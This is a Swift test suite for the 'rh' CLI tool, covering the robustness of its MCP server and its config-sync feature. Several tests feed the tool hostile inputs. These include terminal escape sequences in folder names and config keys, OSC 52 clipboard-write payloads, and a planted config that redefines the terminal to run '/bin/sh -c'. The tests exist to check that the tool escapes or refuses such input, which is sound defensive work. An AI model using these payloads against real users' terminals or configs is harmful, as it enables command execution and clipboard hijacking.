        }
    }

    @Test func mcpRefusesAnOversizedLineAndKeepsServing() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        // A request bigger than the server will buffer: it is answered once, with an error, and then ignored.
        let huge = Data(repeating: UInt8(ascii: "x"), count: 3 * 1024 * 1024)
        var input = Data(#"{"jsonrpc":"2.0","id":1,"method":"ping"}"#.utf8) + Data("\n".utf8)
        input += huge + Data("\n".utf8)
        input += Data(#"{"jsonrpc":"2.0","id":2,"method":"ping"}"#.utf8) + Data("\n".utf8)
        let replies = try mcpReplies(rh, to: input)
        #expect(replies.count == 3, "got \(replies.count) replies")
        let errors = replies.filter { $0["error"] != nil }
        #expect(errors.count == 1)
        #expect((errors.first?["error"] as? [String: Any])?["code"] as? Int == -32600)
        #expect(Set(replies.compactMap { $0["id"] as? Int }) == [1, 2], "the requests either side of the huge line were not both answered")
    }

    @Test func aRequestAsBigAsTheBiggestHonestOneIsStillServed() throws {
        // 200 paths of 1024 characters each: the schema's own limits, about 200 KB of JSON.
        let rh = try RH(); defer { rh.cleanUp() }
        let paths = (0..<200).map { index in "\"/" + String(repeating: "a", count: 1023 - String(index).count) + String(index) + "\"" }
        let line = #"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"right_here_run","arguments":{"action":"reveal","dry_run":true,"paths":["# + paths.joined(separator: ",") + "]}}}\n"
        let replies = try mcpReplies(rh, to: Data(line.utf8))
        #expect(replies.count == 1)
        // It reached the tool (which then says the paths do not exist); it was not turned away as too large.
        #expect(replies.first?["error"] == nil)
        #expect(((replies.first?["result"] as? [String: Any])?["isError"] as? Bool) == true)
    }

    @Test func mcpAnswersEveryRequestOfALongPipelinedBurst() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        var input = Data()
        for id in 0..<3000 { input += Data(#"{"jsonrpc":"2.0","id":\#(id),"method":"ping"}"#.utf8) + Data("\n".utf8) }
        let replies = try mcpReplies(rh, to: input)
        #expect(replies.count == 3000)
        #expect(Set(replies.compactMap { $0["id"] as? Int }) == Set(0..<3000))
    }

    @Test func mcpFinishesQuietlyWhenItsClientHasGone() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let process = Process()
        process.executableURL = rh.binary
        process.arguments = ["mcp"]
        process.environment = rh.environment()
        let input = Pipe(), output = Pipe(), errors = Pipe()
        process.standardInput = input
        process.standardOutput = output
        process.standardError = errors
        try process.run()
        let timer = rh.watchdog(process)
        defer { timer.cancel() }
        // The client vanishes: nobody reads standard output any more, while standard input stays open.
        try output.fileHandleForReading.close()
        try input.fileHandleForWriting.write(contentsOf: Data(#"{"jsonrpc":"2.0","id":1,"method":"ping"}"#.utf8) + Data("\n".utf8))
        let deadline = Date().addingTimeInterval(10)
        while process.isRunning && Date() < deadline { usleep(20_000) }
        let stillRunning = process.isRunning
        if stillRunning { process.terminate() }
        process.waitUntilExit()
        #expect(!stillRunning, "the server kept running with nobody to answer")
        #expect(process.terminationReason == .exit, "it died by a signal instead of finishing")
        #expect(process.terminationStatus == 0)
        #expect(String(decoding: errors.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self).isEmpty, "it wrote a crash report")
        try? input.fileHandleForWriting.close()
    }

    @Test("a request nested far deeper than any honest one is refused, and the server lives on", arguments: [40, 480, 100_000])
    func mcpSurvivesDeepNesting(depth: Int) throws {
        // About 1 KB of "[" used to overflow the decoder's stack and kill the server (SIGBUS).
        let rh = try RH(); defer { rh.cleanUp() }
        let deep = String(repeating: "[", count: depth) + "1" + String(repeating: "]", count: depth)
        let input = Data(("{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"ping\",\"params\":{\"x\":" + deep + "}}\n"
                          + "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"ping\"}\n").utf8)
        let replies = try mcpReplies(rh, to: input)
        #expect(replies.count == 2, "got \(replies)")
        let refusal = replies.first { ($0["error"] as? [String: Any])?["code"] as? Int == -32600 }
        #expect(refusal != nil, "the deep request should be refused as invalid")
        #expect(replies.contains { $0["id"] as? Int == 2 && $0["result"] != nil }, "the ping after it was not answered")
    }

    @Test("a dotted key a thousand segments long is a syntax error, not a stack overflow", arguments: ["", "x = {"])
    func aLongDottedKeyIsASyntaxErrorNotACrash(prefix: String) throws {
        let key = String(repeating: "a.", count: 1_000) + "b = 1"
        let rh = try RH(config: prefix + key + (prefix.isEmpty ? "" : "}") + "\n")
        defer { rh.cleanUp() }
        let result = try rh.run(["config", "validate"])
        #expect(result.status == 1, "status \(result.status): \(result.standardError)")
        #expect(try rh.run(["actions"]).status == 0)
    }

    @Test("an empty path or an unknown menu language is refused, not guessed", arguments: [
        (["run", "copy-path.absolute", "--dry-run", ""], "empty path"),
        (["run", "copy-path.absolute", "--dry-run", "--container", ""], "empty path"),
        (["menu", "--language", "xx"], "No translation")
    ])
    func emptyPathAndUnknownLanguageAreRefused(arguments: [String], message: String) throws {
        let rh = try RH(config: "")
        defer { rh.cleanUp() }
        let result = try rh.run(arguments)
        #expect(result.status != 0, "status \(result.status)")
        #expect((result.standardOutput + result.standardError).contains(message))
    }

    @Test func aFailedRunWithJSONPrintsJSONOnStdout() throws {
        let rh = try RH(config: "")
        defer { rh.cleanUp() }
        let result = try rh.run(["run", "open.terminal", "--json", "/nonexistent-rh-test-folder"])
        #expect(result.status == 1)
        let object = try #require(try JSONSerialization.jsonObject(with: Data(result.standardOutput.utf8)) as? [String: Any])
        #expect(object["ok"] as? Bool == false)
        #expect((object["error"] as? String)?.contains("does not exist") == true)
    }

    @Test("a config that ends inside an unterminated header is a syntax error, not a crash", arguments: ["[\"\"", "[ ''", "[[\"\"", "x = 1\n[\"\"", "[\"\".\"\""])
    func aTruncatedHeaderIsASyntaxErrorNotACrash(text: String) throws {
        let rh = try RH(config: text); defer { rh.cleanUp() }
        let result = try rh.run(["config", "validate"])
        #expect(result.status == 1, "status \(result.status): \(result.standardError)")
        #expect(try rh.run(["actions"]).status == 0)
    }

    @Test func aConfigNestedFarDeeperThanAnyRealOneIsASyntaxErrorNotACrash() throws {
        let rh = try RH(config: "x = " + String(repeating: "[", count: 5_000) + String(repeating: "]", count: 5_000) + "\n")
        defer { rh.cleanUp() }
        let result = try rh.run(["config", "validate"])
        #expect(result.status == 1, "status \(result.status): \(result.standardError)")
        #expect((result.standardOutput + result.standardError).contains("nested more than"))
        // Every other command keeps working with that config in place: defaults apply.
        #expect(try rh.run(["actions"]).status == 0)
    }

    @Test("a folder name with terminal escape sequences never reaches the screen unescaped, in any text rh prints")
    func namesAreEscapedInEveryLineRhPrints() throws {
        let rh = try RH(config: "[new_file]\nthen = \"nothing\"\n"); defer { rh.cleanUp() }
        let hostile = "dir\u{1b}]0;PWNED\u{7}\u{1b}[31mred"
        let folder = rh.configDirectory.appendingPathComponent(hostile)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        let missing = rh.configDirectory.appendingPathComponent("nope\u{1b}[2J").path
        let outputs = [
            try rh.run(["run", "open.terminal@terminal", "--dry-run", "--container", folder.path]),
            try rh.run(["run", "new-file.md", "--dry-run", "--container", folder.path]),
            try rh.run(["run", "reveal", "--dry-run", missing]),
            try rh.run(["run", "reveal", "--dry-run", "--", folder.path]),
            try rh.run(["menu", "--container", folder.path]),
            try rh.run(["menu", "--", folder.path]),
            try rh.run(["run", "new-file.md", "--container", folder.path])
        ]
        for output in outputs {
            let bytes = Array((output.standardOutput + output.standardError).utf8)
            #expect(!bytes.contains(0x1b) && !bytes.contains(0x07), "raw terminal control bytes in: \(output.standardOutput.debugDescription) \(output.standardError.debugDescription)")
        }
        #expect(outputs[0].status == 0 && outputs[2].status == 1, "the commands were meant to run")
    }

    @Test func aWorkingDirectoryThatWasDeletedIsNoTargetNotTheRelativePathDot() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let doomed = rh.configDirectory.appendingPathComponent("doomed")
        try FileManager.default.createDirectory(at: doomed, withIntermediateDirectories: true)
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = ["-c", "cd \"$1\" && rmdir \"$1\" && exec \"$2\" run agent.claude@terminal --dry-run", "sh", doomed.path, rh.binary.path]
        process.environment = rh.environment()
        let out = Pipe(), err = Pipe()
        process.standardOutput = out
        process.standardError = err
        try process.run()
        let timer = rh.watchdog(process)
        defer { timer.cancel() }
        let text = String(decoding: out.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self) + String(decoding: err.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
        process.waitUntilExit()
        #expect(process.terminationStatus == 1, Comment(rawValue: text))
        #expect(!text.contains("cd . "), "it planned a cd into the relative path dot")
        #expect(text.contains("no folder"), Comment(rawValue: text))
    }

    @Test func aConfigDefinedTerminalReallyStartsACommandThroughItsTemplate() throws {
        // The "terminal" is /usr/bin/touch: no window, but the real executor runs the real argument vector.
        let config = """
        [general]
        agents = ["marker"]
        [[app]]
        id = "faketerm"
        name = "Fake"
        bundle_id = "com.apple.finder"
        role = "terminal"
        run_args = ["/usr/bin/touch", "{dir}/ran-{command}"]
        [agent.marker]
        name = "marker"
        command = "marker"
        """
        let rh = try RH(config: config); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("it's a folder")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        let result = try rh.run(["run", "agent.marker@faketerm", "--container", folder.path])
        #expect(result.status == 0, Comment(rawValue: result.standardError))
        #expect(FileManager.default.fileExists(atPath: folder.appendingPathComponent("ran-marker").path), "the template did not run in the folder")
    }

    @Test func mcpAnswersAMalformedRequestWithoutStoppingTheOnesAfterIt() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let input = Data("{broken\n{\"jsonrpc\":\"2.0\",\"id\":true,\"method\":\"ping\"}\n5\n{\"jsonrpc\":\"2.0\",\"id\":9,\"method\":\"ping\"}\n".utf8)
        let replies = try mcpReplies(rh, to: input)
        #expect(replies.count == 4)
        #expect(replies.filter { $0["result"] != nil }.count == 1)
        #expect(replies.filter { ($0["error"] as? [String: Any])?["code"] as? Int == -32700 }.count == 1)
        #expect(replies.filter { ($0["error"] as? [String: Any])?["code"] as? Int == -32600 }.count == 2, "the boolean id and the bare 5")
    }

    @Test func mcpAnswersOverStandardInput() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let process = Process()
        process.executableURL = rh.binary
        process.arguments = ["mcp"]
        process.environment = rh.environment()
        let input = Pipe(), output = Pipe()
        process.standardInput = input
        process.standardOutput = output
        try process.run()
        let timer = rh.watchdog(process)
        defer { timer.cancel() }
        input.fileHandleForWriting.write(Data(#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18"}}"#.utf8) + Data("\n".utf8))
        try input.fileHandleForWriting.close()
        let data = output.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        let reply = try #require(try JSONSerialization.jsonObject(with: data) as? [String: Any])
        #expect((reply["result"] as? [String: Any])?["protocolVersion"] as? String == "2025-06-18")
    }
}

@Suite("rh config sync")
struct ConfigSyncCLITests {
    /// An `rh` whose home, config included, is a folder of its own, with the config written where `rh config path` says.
    private func isolated(config: String? = nil) throws -> RH {
        let rh = try RH(trialHome: true)
        if let config {
            let file = try configFile(rh)
            try FileManager.default.createDirectory(at: file.deletingLastPathComponent(), withIntermediateDirectories: true)
            try config.write(to: file, atomically: true, encoding: .utf8)
        }
        return rh
    }

    private func configFile(_ rh: RH) throws -> URL {
        URL(fileURLWithPath: try rh.run(["config", "path"]).standardOutput.trimmingCharacters(in: .whitespacesAndNewlines))
    }

    @Test func theDefaultFolderIsResolvedThroughTheTrialHome() throws {
        let rh = try isolated(); defer { rh.cleanUp() }
        let result = try rh.run(["config", "sync", "enable"])
        #expect(result.status == 0, "\(result.standardError)")
        let home = try #require(rh.home)
        #expect(result.standardOutput.contains(home.path + "/Library/Mobile Documents/com~apple~CloudDocs/Right Here"))
        #expect(!FileManager.default.fileExists(atPath: home.appendingPathComponent("Library").path), "enable must not create the folder")
    }

    @Test func pushStatusPullRoundTrip() throws {
        let rh = try isolated(config: "[general]\nterminal = \"terminal\"\n"); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("synced")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        #expect(try rh.run(["config", "sync", "status"]).status == 1)
        #expect(try rh.run(["config", "sync", "enable", "--folder", folder.path]).status == 0)
        let before = try #require(try rh.run(["config", "sync", "status", "--json"]).json as? [String: Any])
        #expect(before["status"] as? String == "remote-missing")
        #expect(try rh.run(["config", "sync", "push"]).status == 0)
        #expect(try String(contentsOf: folder.appendingPathComponent("config.toml"), encoding: .utf8) == "[general]\nterminal = \"terminal\"\n")
        let after = try #require(try rh.run(["config", "sync", "status", "--json"]).json as? [String: Any])
        #expect(after["status"] as? String == "in-sync")
        try "[general]\nterminal = \"ghostty\"\n".write(to: folder.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8)
        #expect((try rh.run(["config", "sync", "status", "--json"]).json as? [String: Any])?["status"] as? String == "remote-ahead")
        #expect(try rh.run(["config", "sync", "pull"]).status == 0)
        #expect(try String(contentsOf: try configFile(rh), encoding: .utf8) == "[general]\nterminal = \"ghostty\"\n")
        #expect(try rh.run(["config", "sync", "disable"]).status == 0)
        #expect(try rh.run(["config", "sync", "status"]).status == 1)
    }

    @Test func aDeletedConfigIsRestoredByAPlainPullAndTheAdviceSaysSo() throws {
        let rh = try isolated(config: "[general]\nterminal = \"terminal\"\n"); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("synced")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        _ = try rh.run(["config", "sync", "enable", "--folder", folder.path])
        #expect(try rh.run(["config", "sync", "push"]).status == 0)
        let local = try configFile(rh)
        try FileManager.default.removeItem(at: local)
        let status = try rh.run(["config", "sync", "status"])
        #expect(status.standardOutput.contains("remote-ahead") && status.standardOutput.contains("`rh config sync pull`"), "\(status.standardOutput)")
        #expect(!status.standardOutput.contains("`rh config sync push`"), "advice to push a file that is not there: \(status.standardOutput)")
        #expect(try rh.run(["config", "sync", "pull"]).status == 0)
        #expect(try String(contentsOf: local, encoding: .utf8) == "[general]\nterminal = \"terminal\"\n")
    }

    @Test func pullRefusesALocalEditUnlessForced() throws {
        let rh = try isolated(config: "[general]\nterminal = \"terminal\"\n"); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("synced")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        _ = try rh.run(["config", "sync", "enable", "--folder", folder.path])
        _ = try rh.run(["config", "sync", "push"])
        let local = try configFile(rh)
        try "[general]\nterminal = \"ghostty\"\n".write(to: local, atomically: true, encoding: .utf8)
        try "[general]\neditor = \"vscode\"\n".write(to: folder.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8)
        let refused = try rh.run(["config", "sync", "pull"])
        #expect(refused.status == 1)
        #expect(refused.standardError.contains("--force"))
        #expect(try String(contentsOf: local, encoding: .utf8) == "[general]\nterminal = \"ghostty\"\n")
        #expect(try rh.run(["config", "sync", "pull", "--force"]).status == 0)
        #expect(try String(contentsOf: local, encoding: .utf8) == "[general]\neditor = \"vscode\"\n")
        let saved = try FileManager.default.contentsOfDirectory(atPath: local.deletingLastPathComponent().path).filter { $0.hasPrefix("config.toml.bak-") }
        #expect(saved.count == 1)
    }

    @Test func aPullThatWouldAddProgramsIsRefusedUntilTheyAreAllowed() throws {
        let original = "[general]\nterminal = \"terminal\"\n"
        let rh = try isolated(config: original); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("synced")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        _ = try rh.run(["config", "sync", "enable", "--folder", folder.path])
        #expect(try rh.run(["config", "sync", "push"]).status == 0)
        // What someone with write access to the folder can leave there: the built-in terminal, redefined to run a program.
        let planted = """
        [general]
        terminal = "terminal"
        [[app]]
        id = "terminal"
        name = "Terminal"
        bundle_id = "com.apple.Terminal"
        role = "terminal"
        open_args = ["/usr/bin/id", "-un", "{dir}"]
        run_args = ["/bin/sh", "-c", "{command}"]
        """
        try planted.write(to: folder.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8)
        let local = try configFile(rh)
        let status = try rh.run(["config", "sync", "status"])
        #expect(status.standardOutput.contains("/usr/bin/id") && status.standardOutput.contains("--allow-commands"), "\(status.standardOutput)")
        let pending = (try rh.run(["config", "sync", "status", "--json"]).json as? [String: Any])?["pendingLaunchCommands"] as? [String]
        #expect(pending?.contains { $0.contains("run_args") && $0.contains("/bin/sh") } == true, "\(String(describing: pending))")

        let refused = try rh.run(["config", "sync", "pull"])
        #expect(refused.status == 1)
        #expect(refused.standardError.contains("--allow-commands") && refused.standardError.contains("/usr/bin/id"), "\(refused.standardError)")
        #expect(try String(contentsOf: local, encoding: .utf8) == original)
        // --force is about this Mac's own edits, not about programs.
        try "[general]\nterminal = \"ghostty\"\n".write(to: local, atomically: true, encoding: .utf8)
        let forced = try rh.run(["config", "sync", "pull", "--force"])
        #expect(forced.status == 1 && forced.standardError.contains("--allow-commands"), "\(forced.standardError)")
        #expect(try String(contentsOf: local, encoding: .utf8) == "[general]\nterminal = \"ghostty\"\n")

        let allowed = try rh.run(["config", "sync", "pull", "--force", "--allow-commands"])
        #expect(allowed.status == 0, "\(allowed.standardError)")
        #expect(try String(contentsOf: local, encoding: .utf8) == planted)
        #expect(try rh.run(["config", "sync", "pull", "--help"]).standardOutput.contains("--allow-commands"))
    }

    @Test func textFromTheConfigIsNeverPrintedRaw() throws {
        // Keys and values a config can carry: terminal escape sequences, a bell, a C1 control, a right-to-left override.
        let hostile = """
        "k\\u001b]0;pwned\\u0007" = 1
        [general]
        terminal = "x\\u001b[2J\\u202Egnp"
        [menu]
        items = ["agent.\\u009b31m"]
        """
        func acts(_ text: String) -> Bool {
            text.unicodeScalars.contains { $0 != "\n" && ($0.properties.generalCategory == .control || $0 == "\u{202E}") }
        }
        let rh = try isolated(config: hostile); defer { rh.cleanUp() }
        let validate = try rh.run(["config", "validate"])
        let json = try rh.run(["config", "validate", "--json"])
        // `run` and `menu` report config problems on standard error before they do anything.
        let run = try rh.run(["run", "--dry-run", "copy-path.name", rh.configDirectory.path])
        let menu = try rh.run(["menu", "--container", rh.configDirectory.path])
        for (name, text) in [("validate", validate.standardOutput), ("validate --json", json.standardOutput), ("run", run.standardError + run.standardOutput), ("menu", menu.standardError)] {
            #expect(!acts(text), "\(name) printed a character a terminal acts on: \(text.debugDescription)")
            #expect(text.contains("\\u001b") || text.contains("\\\\u001b"), "\(name) did not show the escaped key: \(text.debugDescription)")
        }
    }

    @Test func aHostileKeyInTheFolderConfigIsNeverPrintedRawByPull() throws {
        let rh = try isolated(config: "[general]\nterminal = \"terminal\"\n"); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("synced")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        _ = try rh.run(["config", "sync", "enable", "--folder", folder.path])
        _ = try rh.run(["config", "sync", "push"])
        try "[general]\nterminal = \"terminal\"\n\"token\\u001b]52;c;ZWNobyBwd25lZA==\\u0007\" = \"x\"\n".write(to: folder.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8)
        let result = try rh.run(["config", "sync", "pull"])
        #expect(result.status == 1)
        #expect(!result.standardError.unicodeScalars.contains { $0 != "\n" && $0.properties.generalCategory == .control }, "\(result.standardError.debugDescription)")
        #expect(result.standardError.contains(#"token\u001b]52"#), "\(result.standardError)")
        #expect(!result.standardError.contains(".."), "\(result.standardError)")
    }

    @Test func enablingOnAMachineWithoutAConfigSaysWhatTheFolderWouldStart() throws {
        let rh = try isolated(); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("synced")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        try "[agent.mine]\nname = \"Mine\"\ncommand = \"mine --yes\"\n".write(to: folder.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8)
        let result = try rh.run(["config", "sync", "enable", "--folder", folder.path])
        #expect(result.status == 0)
        #expect(result.standardOutput.contains("mine --yes") && result.standardOutput.contains("--allow-commands"), "\(result.standardOutput)")
        #expect(!FileManager.default.fileExists(atPath: try configFile(rh).path))
    }

    @Test func aConfigWithASecretLookingKeyIsNotPushed() throws {
        let rh = try isolated(config: "[agent.mine]\nname = \"M\"\ncommand = \"m\"\napi_key = \"x\"\n"); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("synced")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        _ = try rh.run(["config", "sync", "enable", "--folder", folder.path])
        let result = try rh.run(["config", "sync", "push", "--force"])
        #expect(result.status == 1)
        #expect(result.standardError.contains("secret"))
        #expect(!FileManager.default.fileExists(atPath: folder.appendingPathComponent("config.toml").path))
    }

    @Test func anOverlayIsReadByValidateAndNamedInProblems() throws {
        let rh = try isolated(config: "[general]\nterminal = \"terminal\"\n"); defer { rh.cleanUp() }
        let overlay = try configFile(rh).deletingLastPathComponent().appendingPathComponent("config.local.toml")
        try "[general]\ntermnial = \"x\"\n".write(to: overlay, atomically: true, encoding: .utf8)
        let result = try rh.run(["config", "validate"])
        #expect(result.standardOutput.contains("config.local.toml"))
        let report = try #require(try rh.run(["config", "validate", "--json"]).json as? [String: Any])
        #expect(report["localExists"] as? Bool == true)
        #expect((report["diagnostics"] as? [[String: Any]])?.first?["file"] as? String == "config.local.toml")
    }

    @Test func aCopyPastTheSizeLimitIsReportedAndNeitherReadNorReplaced() throws {
        let rh = try isolated(config: "[general]\nterminal = \"terminal\"\n"); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("synced")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        let huge = "[agent.mine]\nname = \"Mine\"\ncommand = \"mine --yes\"\n# " + String(repeating: "x", count: ConfigParser.maxBytes) + "\n"
        try huge.write(to: folder.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8)
        let enable = try rh.run(["config", "sync", "enable", "--folder", folder.path])
        #expect(enable.status == 0, "\(enable.standardError)")
        #expect(enable.standardOutput.contains("remote-evicted") && enable.standardOutput.contains("past the 1024 KB a config may have"), "\(enable.standardOutput)")
        #expect(!enable.standardOutput.contains("mine --yes"), "the copy was parsed: \(enable.standardOutput)")
        let json = try #require(try rh.run(["config", "sync", "status", "--json"]).json as? [String: Any])
        #expect(json["remoteSHA256"] == nil && (json["pendingLaunchCommands"] as? [String])?.isEmpty == true, "\(json)")
        for arguments in [["pull", "--force", "--allow-commands"], ["push", "--force"]] {
            let refused = try rh.run(["config", "sync"] + arguments)
            #expect(refused.status == 1 && refused.standardError.contains("is never replaced"), "\(arguments): \(refused.standardError)")
        }
        #expect(try String(contentsOf: folder.appendingPathComponent("config.toml"), encoding: .utf8) == huge)
        #expect(try String(contentsOf: try configFile(rh), encoding: .utf8) == "[general]\nterminal = \"terminal\"\n")
    }

    @Test func aNameWithAnEscapeSequenceIsAnErrorForValidateAndStopsAPull() throws {
        // What a config from the sync folder can carry in an app's name: an OSC 52 clipboard write and a bell.
        let hostile = "[[app]]\nid = \"evil\"\nname = \"Evil\\u001b]52;c;aGk=\\u0007\"\nbundle_id = \"com.apple.TextEdit\"\nrole = \"editor\"\n"
        let rh = try isolated(config: hostile); defer { rh.cleanUp() }
        let validate = try rh.run(["config", "validate"])
        #expect(validate.status == 1, "\(validate.standardOutput)")
        #expect(validate.standardOutput.contains("app.1.name") && validate.standardOutput.contains("control character"), "\(validate.standardOutput)")
        #expect(!validate.standardOutput.unicodeScalars.contains { $0 == "\u{1B}" || $0 == "\u{07}" }, "\(validate.standardOutput.debugDescription)")
        let json = try #require(try rh.run(["config", "validate", "--json"]).json as? [String: Any])
        #expect(json["ok"] as? Bool == false && !((json["diagnostics"] as? [[String: Any]]) ?? []).isEmpty)
        // The same config in the sync folder is refused by `pull`, with or without the flags.
        let folder = rh.configDirectory.appendingPathComponent("synced")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        try hostile.write(to: folder.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8)
        try FileManager.default.removeItem(at: try configFile(rh))
        _ = try rh.run(["config", "sync", "enable", "--folder", folder.path])
        let pull = try rh.run(["config", "sync", "pull", "--force", "--allow-commands"])
        #expect(pull.status == 1 && pull.standardError.contains("control character"), "\(pull.standardError)")
        #expect(!FileManager.default.fileExists(atPath: try configFile(rh).path))
    }

    @Test func syncIsListedInHelp() throws {
        let rh = try isolated(); defer { rh.cleanUp() }
        let text = try rh.run(["config", "--help"]).standardOutput
        #expect(text.contains("sync"))
        let sync = try rh.run(["config", "sync", "--help"]).standardOutput
        for word in ["enable", "status", "pull", "push", "disable"] { #expect(sync.contains(word)) }
    }
}
